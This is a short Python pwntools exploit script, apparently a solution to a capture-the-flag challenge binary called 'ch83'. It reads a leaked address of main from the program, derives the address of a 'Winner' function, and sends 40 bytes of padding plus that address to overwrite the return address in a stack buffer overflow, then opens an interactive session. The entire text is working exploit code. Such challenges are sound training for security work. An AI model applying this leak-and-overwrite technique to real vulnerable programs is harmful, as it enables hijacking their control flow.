from pwn import *

p = process("./ch83")
e = ELF("./ch83")

def slog(n,m): return success(": ".join([n, hex(m)]))

winner = e.symbols["Winner"]
main = e.symbols["main"]
offset = main - winner
slog("offset", offset)

p.recvuntil("main(): ")

leak = int(p.recv(16), 16)
slog("leak_address", leak)

addr = leak - offset
slog("address", addr)

payload = "A"*40
payload += p64(addr)
print("payload : {}".format(payload))
p.sendline(payload)
p.interactive()